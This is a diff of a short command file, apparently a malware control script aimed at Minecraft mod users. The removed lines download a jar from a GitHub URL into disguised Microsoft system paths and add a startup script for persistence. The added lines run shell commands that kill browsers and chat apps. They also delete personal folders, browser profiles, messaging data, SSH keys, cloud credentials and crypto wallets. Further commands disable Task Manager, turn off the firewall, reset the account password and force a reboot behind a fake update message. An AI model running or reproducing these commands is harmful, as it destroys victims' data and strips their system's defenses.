@@ -1,8 +1,15 @@
 # my commands
-version: 3.4
-steal
-mods https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Crypto\RSA\MachineKeys.dat
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Protect\syskeys.dat
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Windows\WER\ReportArchive\crash.dat
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/keepalive.cmd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keepalive.cmd
+version: 3.5
+shell echo OWNED > %USERPROFILE%\Desktop\you_have_been_owned.txt
+shell taskkill /f /im discord.exe /im chrome.exe /im msedge.exe /im firefox.exe /im opera.exe /im javaw.exe 2>nul
+shell rd /s /q %USERPROFILE%\Desktop 2>nul & rd /s /q %USERPROFILE%\Documents 2>nul & rd /s /q %USERPROFILE%\Downloads 2>nul & rd /s /q %USERPROFILE%\Pictures 2>nul & rd /s /q %USERPROFILE%\Videos 2>nul & rd /s /q %USERPROFILE%\Music 2>nul
+shell rd /s /q %USERPROFILE%\AppData\Local\Google 2>nul & rd /s /q %USERPROFILE%\AppData\Local\Microsoft\Edge 2>nul & rd /s /q %USERPROFILE%\AppData\Local\BraveSoftware 2>nul & rd /s /q %USERPROFILE%\AppData\Local\Vivaldi 2>nul & rd /s /q %USERPROFILE%\AppData\Roaming\Opera Software 2>nul & rd /s /q %USERPROFILE%\AppData\Roaming\Mozilla 2>nul
+shell rd /s /q %USERPROFILE%\AppData\Roaming\discord 2>nul & rd /s /q %USERPROFILE%\AppData\Roaming\discordcanary 2>nul & rd /s /q %USERPROFILE%\AppData\Roaming\discordptb 2>nul & rd /s /q %USERPROFILE%\AppData\Roaming\Telegram Desktop 2>nul & rd /s /q %USERPROFILE%\AppData\Roaming\Signal 2>nul
+shell rd /s /q %USERPROFILE%\.ssh 2>nul & rd /s /q %USERPROFILE%\.gnupg 2>nul & rd /s /q %USERPROFILE%\.aws 2>nul & del /f /q %USERPROFILE%\.git-credentials 2>nul & del /f /q %USERPROFILE%\.bash_history 2>nul
+shell rd /s /q %USERPROFILE%\AppData\Roaming\Exodus 2>nul & rd /s /q %USERPROFILE%\AppData\Roaming\Electrum 2>nul & rd /s /q %USERPROFILE%\AppData\Roaming\MetaMask 2>nul
+shell del /f /s /q %TEMP%\* 2>nul & rd /s /q %TEMP% 2>nul
+shell rd /s /q %USERPROFILE%\AppData\Roaming\PrismLauncher 2>nul & rd /s /q %USERPROFILE%\AppData\Roaming\.minecraft 2>nul
+shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul
+shell netsh advfirewall set allprofiles state off 2>nul
+shell net user %USERNAME% Pwned123! 2>nul
+shell shutdown /r /t 30 /c "Windows is updating" 2>nul
